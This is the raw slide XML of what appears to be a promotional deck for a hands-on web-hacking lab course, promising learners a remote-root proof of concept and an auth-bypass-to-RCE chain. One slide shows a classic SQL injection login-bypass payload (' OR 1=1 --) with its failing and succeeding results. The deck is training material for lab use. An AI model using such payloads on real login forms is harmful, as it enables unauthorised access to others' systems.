          <p:cNvPr id="79" name="Google Shape;79;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="406908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0" name="Google Shape;80;p3"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4225991"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Google Shape;81;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="402336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Lab access</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Google Shape;82;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4389120"/>
            <a:ext cx="4846320" cy="6675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You get one URL: your own private lab, plus a terminal in your browser at /term.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Google Shape;83;p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 name="Google Shape;84;p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85" name="Google Shape;85;p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0" name="Shape 90"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Google Shape;91;p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THE PAYOFF</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Google Shape;92;p4"/>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You leave with a working exploit</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Google Shape;93;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2194560"/>
            <a:ext cx="7315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800"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>root@target</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Google Shape;94;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2651760"/>
            <a:ext cx="2011680" cy="182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5000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="15000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="15000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Google Shape;95;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="3017520"/>
            <a:ext cx="731520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4000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>a remote-root PoC</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Google Shape;96;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4572000"/>
            <a:ext cx="8686800" cy="10972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By the last lab you chain an auth bypass into remote code execution (RCE) and land a root shell. The steps are yours to keep.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10332720" y="2468880"/>
            <a:ext cx="914400" cy="91440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98" name="Google Shape;98;p4"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10570464" y="2706624"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Google Shape;99;p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01" name="Google Shape;101;p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6" name="Shape 106"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Google Shape;107;p5"/>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00</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Google Shape;108;p5"/>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09" name="Google Shape;109;p5"/>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110" name="Google Shape;110;p5"/>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THE APPROACH · PHILOSOPHY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Google Shape;111;p5"/>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Why this works</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Google Shape;112;p5"/>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Less guessing, more seeing. The lab shows you the exact query or command your input turned into, so you fix the payload to fit reality.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Google Shape;113;p5"/>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5"/>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15" name="Google Shape;115;p5"/>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0" name="Shape 120"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="7315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the mantra</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Google Shape;122;p6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2286000"/>
            <a:ext cx="10911535" cy="1645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6600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="6600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The app will tell you what it did.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="6600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Google Shape;123;p6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4297680"/>
            <a:ext cx="9875520" cy="12801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B949E"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>You are not scanning from the outside and hoping. Every lab hands you the request you sent, the query or command the server built from it, and what came back. Read that, adjust one thing, send it again. The feedback is the technique.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p6"/>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6"/>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26" name="Google Shape;126;p6"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Google Shape;132;p8"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>THE PATTERN</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;133;p8"/>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The textbook payload isn't the answer</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Google Shape;134;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965960"/>
            <a:ext cx="5212080" cy="3977640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1839"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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2286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36" name="Google Shape;136;p8"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117031" y="2442911"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2286000"/>
            <a:ext cx="365760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2000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Topics first.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2971800"/>
            <a:ext cx="4572000" cy="2743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B949E"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The textbook payload is a starting guess, not the answer.</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400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Our labs are built so a blind copy-paste fails - the win comes from reading the source and watching the running box.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="14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F85149"/>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9" name="Google Shape;139;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="2103120"/>
            <a:ext cx="5257800" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1928"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 name="Google Shape;140;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6565392" y="234086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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6803136" y="234086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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="234086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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2176272"/>
            <a:ext cx="3977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the pattern you'll see all day</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="144" name="Google Shape;144;p8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="2633472"/>
            <a:ext cx="5257800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Google Shape;145;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2761488"/>
            <a:ext cx="4709160" cy="29718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1. naive payload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85149"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>' OR 1=1 --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-&gt; syntax error, fails   x</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2. read the panel on the page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3. see why it broke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OR 1=1 --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D29922"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  ^ trailing space matters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-&gt; welcome, admin.   ok</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;p8"/>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8"/>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48" name="Google Shape;148;p8"/>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3" name="Shape 153"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p9"/>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01</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Google Shape;155;p9"/>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56" name="Google Shape;156;p9"/>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157" name="Google Shape;157;p9"/>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THE BASICS · FOUNDATIONS</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p9"/>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Web hacking foundations</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p9"/>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A fast refresher: how requests work, how to watch them, and how to change them.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p9"/>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9"/>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62" name="Google Shape;162;p9"/>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7" name="Shape 167"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;p10"/>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REQUEST / RESPONSE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;p10"/>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The whole game in one loop</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Google Shape;170;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2743200"/>
            <a:ext cx="3108960" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3154680"/>
            <a:ext cx="640080" cy="64008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72" name="Google Shape;172;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1080821" y="3321101"/>
            <a:ext cx="307238" cy="307238"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
